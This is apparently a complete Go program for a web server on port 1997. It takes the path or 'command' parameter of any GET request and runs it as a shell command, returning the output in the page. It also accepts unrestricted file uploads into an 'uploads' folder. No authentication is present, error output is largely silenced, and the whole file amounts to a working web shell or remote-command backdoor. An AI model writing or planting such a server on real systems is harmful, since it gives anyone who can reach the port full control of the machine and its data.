package main

import (
	"bufio"
	"flag"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

func sendForm(w http.ResponseWriter) {

	w.Header().Set("Content-type", "text/html")
	str := `<form action="/" method="GET" target="">
		     <label for="command">command:</label>
		       <input type="text" id="command" name="command" size=100 autofocus><br><br>
			   </form>
<form
      enctype="multipart/form-data"
      action="/upload"
      method="post"
    >
      <input type="file" name="myFile" />
      <input type="submit" value="upload" />
    </form>`
	w.Write([]byte(str))
}

func doCommand(w http.ResponseWriter, cmd string, arg ...string) error {

	switch cmd {
	case "favicon.ico":
		return nil
	default:
		break
	}

	l_cmd := exec.Command(cmd, arg...)
	//fmt.Printf("doing %v args %v \n", cmd, arg)
	stdout, err := l_cmd.StdoutPipe()
	if err != nil {
		return err
	}

	if err := l_cmd.Start(); err != nil {
		return err
	}

	rdr := bufio.NewReader(stdout)
	sendForm(w)
	w.Write([]byte(`<textarea disabled="true" style="border: none;background-color:white;width:100%;height:100%;">`))
	for {
		line, _, err := rdr.ReadLine()
		if err != nil {
			break
		}
		str_line := string(line)
		str_line = strings.ReplaceAll(str_line, "textarea", "kextarea")
		w.Write([]byte(str_line))
		w.Write([]byte("\n"))
		if *debug {
			//fmt.Println(string(line))
		}
	}
	w.Write([]byte("</textarea>"))

	l_cmd.Wait()
	return nil

}

func handleGET(w http.ResponseWriter, req *http.Request) {
	cmd := req.URL.RequestURI()
	cmd = strings.TrimPrefix(cmd, "/")
	cmd = strings.TrimPrefix(cmd, "?command=")

	decodedValue, err := url.QueryUnescape(cmd)
	if err != nil {
		//log.Fatal(err)
		return
	}

	lcmd := strings.Fields(decodedValue)
	if err != nil || len(lcmd) == 0 {
		sendForm(w)
		return
	}

	if len(lcmd) > 1 {
		err = doCommand(w, lcmd[0], lcmd[1:]...)
	} else {
		err = doCommand(w, lcmd[0])
	}

	if err != nil {
		sendForm(w)
		return
	}

}
func handler(w http.ResponseWriter, req *http.Request) {

	switch req.Method {
	case http.MethodGet:
		handleGET(w, req)
	default:
		if *debug {
			//fmt.Printf("default case %v\n", req.Method)
		}
	}

}
func uploadFile(w http.ResponseWriter, r *http.Request) {
	if *debug {
		//fmt.Println("File Upload Endpoint Hit")
	}

	// Parse our multipart form, 10 << 20 specifies a maximum
	// upload of 10 MB files.
	r.ParseMultipartForm(10 << 20)
	// FormFile returns the first file for the given key `myFile`
	// it also returns the FileHeader so we can get the Filename,
	// the Header and the size of the file
	file, handler, err := r.FormFile("myFile")
	if err != nil {

		if *debug {
			//fmt.Println("Error Retrieving the File")
			//fmt.Println(err)
		}
		return
	}
	defer file.Close()

	if *debug {
		//fmt.Printf("Uploaded File: %+v\n", handler.Filename)
		//fmt.Printf("File Size: %+v\n", handler.Size)
		//fmt.Printf("MIME Header: %+v\n", handler.Header)
	}

	// Create a temporary file within our temp-images directory that follows
	// a particular naming pattern

	if _, err := os.Stat("uploads"); os.IsNotExist(err) {
		err = os.Mkdir("uploads", os.ModePerm)
		if err != nil {

			if *debug {
				//fmt.Printf("error happend %v\n", err)
			}
			return
		}
	}

	tempFile, err := ioutil.TempFile("uploads", strconv.Itoa(time.Now().Minute())+"-*-"+handler.Filename)
	if err != nil {
		//fmt.Println(err)
	}
	defer tempFile.Close()

	// read all of the contents of our uploaded file into a
	// byte array
	fileBytes, err := ioutil.ReadAll(file)
	if err != nil {
		//fmt.Println(err)
	}
	// write this byte array to our temporary file
	tempFile.Write(fileBytes)
	// return that we have successfully uploaded our file!
	sendForm(w)
	//fmt.Fprintf(w, "Success uploaded file\n")

}

var debug *bool

func main() {

	debug = flag.Bool("debug", false, "debug flag")
	http.HandleFunc("/", handler)
	http.HandleFunc("/upload", uploadFile)
	if err := http.ListenAndServe(":1997", nil); err != nil {
		//log.Fatal(err)
	}
}
